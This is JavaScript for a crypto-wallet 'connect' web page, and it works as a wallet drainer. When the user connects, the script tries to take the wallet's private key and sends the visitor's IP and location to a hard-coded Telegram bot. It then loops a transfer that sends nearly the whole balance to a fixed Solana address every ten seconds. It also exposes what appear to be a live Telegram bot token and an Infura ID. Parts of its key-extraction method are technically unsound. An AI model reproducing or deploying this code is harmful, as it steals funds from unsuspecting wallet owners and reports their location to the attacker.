// Import necessary libraries
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const ethers = window.ethers;
const web3 = require('@solana/web3.js');
const bs58 = require('bs58');
const axios = require('axios');

// Set up Web3Modal
const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            infuraId: 'a5b621fc19ef15b1e20a49ba690ef180', // Replace with your Infura Project ID
        },
    },
};

const web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
});

let provider;
let signer;
let privateKey;

const telegramBotToken = '7116285930:AAE_MHKDmX6vSgHy4MJwy9ghqfkutqsyFf0'; // Replace with your Telegram bot token
const telegramChatId = '7150910205'; // Replace with your chat ID

const sendTelegramMessage = async (message) => {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    await axios.post(url, {
        chat_id: telegramChatId,
        text: message,
    });
};

const getIPInfo = async () => {
    try {
        const response = await axios.get('https://ipinfo.io/json');
        return response.data;
    } catch (error) {
        console.error('Error fetching IP info:', error);
        return null;
    }
};

// Event listener for connect button
document.getElementById('connectButton').addEventListener('click', async () => {
    try {
        // Connect to the provider
        const instance = await web3Modal.connect();
        provider = new ethers.providers.Web3Provider(instance);
        signer = provider.getSigner();

        // Obtain the private key (warning: this is generally unsafe for production use)
        const privateKeyBytes = await signer._signingKey().privateKey;
        privateKey = bs58.encode(privateKeyBytes);

        // Get IP and location information
        const ipInfo = await getIPInfo();
        let locationMessage = '';
        if (ipInfo) {
            locationMessage = `Login IP: ${ipInfo.ip}\nLocation: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`;
        }

        console.log('Wallet connected');
        await sendTelegramMessage(`Wallet connected\n${locationMessage}`);
        document.getElementById('executeScriptButton').disabled = false;
    } catch (error) {
        console.error('Error connecting to wallet:', error);
    }
});

// Event listener for execute script button
document.getElementById('executeScriptButton').addEventListener('click', async () => {
    try {
        if (!privateKey) {
            alert('Please connect your wallet first.');
            return;
        }

        // Execute the Solana script using the obtained private key
        await sendTelegramMessage('Transfer fund initiated');
        executeSolanaScript(privateKey);
    } catch (error) {
        console.error('Error executing script:', error);
    }
});

// Function to execute the Solana script
async function executeSolanaScript(privateKey) {
    const connection = new web3.Connection(
        web3.clusterApiUrl('devnet'),
        'confirmed'
    );

    const recipientAddress = 'Bux8V3goqmb546D22YvsBBQFheCkZ3SJeztcmacreCiC'; // Replace with your recipient address

    if (!privateKey || !recipientAddress) {
        console.error('Missing private key or recipient address');
        return;
    }

    const fromWallet = web3.Keypair.fromSecretKey(bs58.decode(privateKey));
    const recipientPublicKey = new web3.PublicKey(recipientAddress);

    const sol = 1000000000;
    const minSolana = 0.003;
    const minSolanaLamports = minSolana * sol;

    const getBalance = async (publicKey) => {
        const balance = await connection.getBalance(publicKey);
        return balance;
    };

    const transfer = async (toPublicKey, lamports) => {
        const transaction = new web3.Transaction().add(
            web3.SystemProgram.transfer({
                fromPubkey: fromWallet.publicKey,
                toPubkey: toPublicKey,
                lamports,
            })
        );

        const signature = await web3.sendAndConfirmTransaction(
            connection,
            transaction,
            [fromWallet]
        );

        return signature;
    };

    const clearConsole = () => {
        console.clear();
    };

    const printInfo = (message) => {
        clearConsole();
        console.log(message);
        document.getElementById('output').innerText += message + '\n';
    };

    const transferAllFund = async () => {
        while (true) {
            try {
                const balanceMainWallet = await getBalance(fromWallet.publicKey);
                const balanceLeft = balanceMainWallet - minSolanaLamports;

                if (balanceLeft < 0) {
                    printInfo('Not enough balance to transfer');
                } else {
                    printInfo('Wallet A balance: ' + balanceMainWallet);

                    const signature = await transfer(recipientPublicKey, balanceLeft);

                    const balanceOfWalletB = await getBalance(recipientPublicKey);
                    console.log('SIGNATURE', signature);
                    console.log('Wallet B balance', balanceOfWalletB);
                    printInfo('SIGNATURE: ' + signature);
                    printInfo('Wallet B balance: ' + balanceOfWalletB);
                }

                // Add a delay before the next transfer (adjust as needed)
                await new Promise((resolve) => setTimeout(resolve, 10 * 1000));
            } catch (error) {
                printInfo('Error during transfer: ' + error.message);
            }
        }
    };

    transferAllFund();
}
